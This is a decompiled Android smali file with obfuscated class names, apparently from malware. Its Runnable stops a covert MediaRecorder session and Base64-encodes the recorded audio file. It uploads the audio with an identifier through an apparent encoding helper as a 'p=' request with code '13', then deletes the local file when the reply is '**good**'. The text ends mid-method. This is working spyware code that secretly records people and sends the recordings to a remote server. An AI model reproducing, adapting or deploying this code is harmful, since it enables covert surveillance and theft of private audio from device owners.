.class Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;I)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:I

.field final synthetic b:Landroid/content/Context;

.field final synthetic c:Landroid/media/MediaRecorder;

.field final synthetic d:Ljava/lang/String;

.field final synthetic e:Ljava/lang/String;

.field final synthetic f:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;


# direct methods
.method constructor <init>(Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;ILandroid/content/Context;Landroid/media/MediaRecorder;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->f:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;

    iput p2, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->a:I

    iput-object p3, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->b:Landroid/content/Context;

    iput-object p4, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->c:Landroid/media/MediaRecorder;

    iput-object p5, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->d:Ljava/lang/String;

    iput-object p6, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->e:Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 10

    const/4 v0, 0x0

    :try_start_0
    iget v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->a:I

    mul-int/lit16 v1, v1, 0x3e8

    int-to-long v1, v1

    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_1
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->f:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;

    iget-object v1, v1, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v2, "SOUND"

    const-string v3, "STOP RECORD SOUND"

    invoke-virtual {v1, v2, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :try_start_1
    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->c:Landroid/media/MediaRecorder;

    invoke-virtual {v1}, Landroid/media/MediaRecorder;->stop()V

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->c:Landroid/media/MediaRecorder;

    invoke-virtual {v1}, Landroid/media/MediaRecorder;->release()V

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->f:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;

    iget-object v1, v1, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v2, "FILE"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, ""

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v4, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->d:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->f:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;

    iget-object v1, v1, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    new-instance v1, Ljava/io/File;

    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->d:Ljava/lang/String;

    invoke-direct {v1, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-static {v1}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/io/File;)[B

    move-result-object v1

    invoke-static {v1, v0}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v0

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->f:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;

    iget-object v1, v1, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->f:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;

    iget-object v2, v2, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v3, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->b:Landroid/content/Context;

    const-string v4, "13"

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "p="

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v6, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->f:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;

    iget-object v6, v6, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v8, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->e:Ljava/lang/String;

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v8, "||:||"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v6, v0}, Lwocwvy/czyxoxmbauu/slsa/b;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v3, v4, v0}, Lwocwvy/czyxoxmbauu/slsa/b;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->f:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;

    iget-object v1, v1, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v2, "\u0417\u0430\u043f\u0440\u043e\u0441"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, " - > "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    const-string v1, "**good**"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    new-instance v0, Ljava/io/File;

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->d:Ljava/lang/String;

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->delete()Z

    :cond_0
    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->f:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;

    iget-object v0, v0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->b:Landroid/content/Context;

    const-string v2, "startRecordSound"

    const-string v3, "stop"

    invoke-virtual {v0, v1, v2, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    return-void

    :catch_0
    move-exception v0

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->f:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;

    iget-object v1, v1, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->b:Landroid/content/Context;

    const-string v3, "startRecordSound"

    const-string v4, "stop"

    invoke-virtual {v1, v2, v3, v4}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->f:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;

    iget-object v1, v1, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v2, "ERROR"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    :goto_0
    const-string v4, "Record Sound! "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v2, v0}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    return-void

    :catchall_0
    move-exception v1

    goto/16 :goto_1

    :catch_1
    :try_start_2
    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->f:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;

    iget-object v1, v1, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->b:Landroid/content/Context;

    const-string v3, "startRecordSound"

    const-string v4, "stop"

    invoke-virtual {v1, v2, v3, v4}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->f:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;

    iget-object v1, v1, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v2, "SOUND"

    const-string v3, "STOP RECORD SOUND"

    invoke-virtual {v1, v2, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :try_start_3
    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->c:Landroid/media/MediaRecorder;

    invoke-virtual {v1}, Landroid/media/MediaRecorder;->stop()V

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->c:Landroid/media/MediaRecorder;

    invoke-virtual {v1}, Landroid/media/MediaRecorder;->release()V

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->f:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;

    iget-object v1, v1, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v2, "FILE"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, ""

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v4, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->d:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->f:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;

    iget-object v1, v1, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    new-instance v1, Ljava/io/File;

    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->d:Ljava/lang/String;

    invoke-direct {v1, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-static {v1}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/io/File;)[B

    move-result-object v1

    invoke-static {v1, v0}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v0

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->f:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;

    iget-object v1, v1, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->f:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;

    iget-object v2, v2, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v3, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->b:Landroid/content/Context;

    const-string v4, "13"

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "p="

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v6, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->f:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;

    iget-object v6, v6, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v8, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->e:Ljava/lang/String;

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v8, "||:||"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v6, v0}, Lwocwvy/czyxoxmbauu/slsa/b;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v3, v4, v0}, Lwocwvy/czyxoxmbauu/slsa/b;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->f:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;

    iget-object v1, v1, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v2, "\u0417\u0430\u043f\u0440\u043e\u0441"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, " - > "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    const-string v1, "**good**"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    new-instance v0, Ljava/io/File;

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->d:Ljava/lang/String;

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->delete()Z

    :cond_1
    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->f:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;

    iget-object v0, v0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->b:Landroid/content/Context;

    const-string v2, "startRecordSound"

    const-string v3, "stop"

    invoke-virtual {v0, v1, v2, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    return-void

    :catch_2
    move-exception v0

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->f:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;

    iget-object v1, v1, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->b:Landroid/content/Context;

    const-string v3, "startRecordSound"

    const-string v4, "stop"

    invoke-virtual {v1, v2, v3, v4}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->f:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;

    iget-object v1, v1, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v2, "ERROR"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    goto/16 :goto_0

    :goto_1
    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->f:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;

    iget-object v2, v2, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v3, "SOUND"

    const-string v4, "STOP RECORD SOUND"

    invoke-virtual {v2, v3, v4}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :try_start_4
    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->c:Landroid/media/MediaRecorder;

    invoke-virtual {v2}, Landroid/media/MediaRecorder;->stop()V

    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->c:Landroid/media/MediaRecorder;

    invoke-virtual {v2}, Landroid/media/MediaRecorder;->release()V

    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->f:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;

    iget-object v2, v2, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v3, "FILE"

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, ""

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v5, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->d:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v3, v4}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->f:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;

    iget-object v2, v2, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    new-instance v2, Ljava/io/File;

    iget-object v3, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->d:Ljava/lang/String;

    invoke-direct {v2, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-static {v2}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/io/File;)[B

    move-result-object v2

    invoke-static {v2, v0}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v0

    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->f:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;

    iget-object v2, v2, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v3, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->f:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;

    iget-object v3, v3, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v4, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->b:Landroid/content/Context;

    const-string v5, "13"

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "p="

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v7, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->f:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;

    iget-object v7, v7, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v9, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->e:Ljava/lang/String;

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v9, "||:||"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v7, v0}, Lwocwvy/czyxoxmbauu/slsa/b;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

